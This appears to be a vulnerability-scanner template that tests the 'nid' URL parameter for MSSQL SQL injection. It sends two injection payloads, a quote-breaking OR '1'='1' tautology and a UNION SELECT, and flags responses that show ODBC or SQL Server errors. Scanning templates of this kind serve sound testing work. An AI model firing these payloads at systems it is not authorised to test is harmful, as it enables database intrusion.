id: sqli3-mssql-11
name: 'SQLi mssql prefix #10 in nid'
severity: high
type: active
tags:
  - sqli
  - injection
  - mssql
description: 'Triggers mssql error via nid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      nid:
        - '''))) OR (((''1''=''1'
        - ''') UNION SELECT 1,2--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ODBC'
          - 'SQL Server'
